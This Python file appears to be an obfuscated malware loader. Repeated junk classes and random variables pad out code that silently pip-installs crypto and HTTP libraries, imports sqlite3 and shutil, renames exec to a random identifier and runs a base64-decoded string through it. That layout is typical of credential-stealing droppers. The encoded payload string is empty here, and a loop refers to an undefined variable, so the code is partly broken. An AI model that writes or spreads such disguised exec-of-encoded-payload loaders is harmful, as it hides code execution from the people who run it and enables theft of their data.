

from sys import executable, stderr
class o8NXzSz4zD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class FD8Qq5bJ9C:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
j0QjuktWPN = 65304279
Nz3GD9D4VH = 77297634
jm36YuxpZ8 = 84779393
class FKA0oRixhk:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class pFaVk2FQfV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class B1zaCPPyMt:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
t7yMPyJZaY = 79443460
FUCvktywuC = 99282788
naKUX0onOD = 65909108
{'username': 'vPxQe2W', 'age': 31}
rc805F50hT = 10990452
DJOwSRvE6I = 26948338
["'W3M4b9RaRk'", "'wrlway2j9c'"]
class Fz3dSQvMxw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Ha2VYC6tYX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
N7hmjfzjKl = 54776787
xEPWvyUHdx = 72332297
class IG9p7m7yf7:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'v5YSSmGYSC'
class QK4ppZ42fn:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TsxgPhHyps:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
class o8NXzSz4zD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class FD8Qq5bJ9C:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
j0QjuktWPN = 65304279
Nz3GD9D4VH = 77297634
jm36YuxpZ8 = 84779393
class FKA0oRixhk:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class pFaVk2FQfV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class B1zaCPPyMt:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
t7yMPyJZaY = 79443460
FUCvktywuC = 99282788
naKUX0onOD = 65909108
{'username': 'vPxQe2W', 'age': 31}
rc805F50hT = 10990452
DJOwSRvE6I = 26948338
["'W3M4b9RaRk'", "'wrlway2j9c'"]
class Fz3dSQvMxw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Ha2VYC6tYX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
N7hmjfzjKl = 54776787
xEPWvyUHdx = 72332297
class IG9p7m7yf7:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'v5YSSmGYSC'
class QK4ppZ42fn:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TsxgPhHyps:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
E3HThzieiybOaAHGWTAzacVMvDNTrTyoTgNtBr = exec
class o8NXzSz4zD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class FD8Qq5bJ9C:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
j0QjuktWPN = 65304279
Nz3GD9D4VH = 77297634
jm36YuxpZ8 = 84779393
class FKA0oRixhk:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class pFaVk2FQfV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class B1zaCPPyMt:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
t7yMPyJZaY = 79443460
FUCvktywuC = 99282788
naKUX0onOD = 65909108
{'username': 'vPxQe2W', 'age': 31}
rc805F50hT = 10990452
DJOwSRvE6I = 26948338
["'W3M4b9RaRk'", "'wrlway2j9c'"]
class Fz3dSQvMxw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Ha2VYC6tYX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
N7hmjfzjKl = 54776787
xEPWvyUHdx = 72332297
class IG9p7m7yf7:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'v5YSSmGYSC'
class QK4ppZ42fn:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TsxgPhHyps:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import concurrent.futures
ygceRLLOSOvlZitqynhTj5IQjgVNB2HrlMy3K1=""
E3HThzieiybOaAHGWTAzacVMvDNTrTyoTgNtBr(base64.b64decode(ygceRLLOSOvlZitqynhTj5IQjgVNB2HrlMy3K1))
class o8NXzSz4zD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class FD8Qq5bJ9C:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
j0QjuktWPN = 65304279
Nz3GD9D4VH = 77297634
jm36YuxpZ8 = 84779393
class FKA0oRixhk:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class pFaVk2FQfV:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class B1zaCPPyMt:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
t7yMPyJZaY = 79443460
FUCvktywuC = 99282788
naKUX0onOD = 65909108
{'username': 'vPxQe2W', 'age': 31}
rc805F50hT = 10990452
DJOwSRvE6I = 26948338
["'W3M4b9RaRk'", "'wrlway2j9c'"]
class Fz3dSQvMxw:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class Ha2VYC6tYX:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
N7hmjfzjKl = 54776787
xEPWvyUHdx = 72332297
class IG9p7m7yf7:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'v5YSSmGYSC'
class QK4ppZ42fn:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class TsxgPhHyps:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data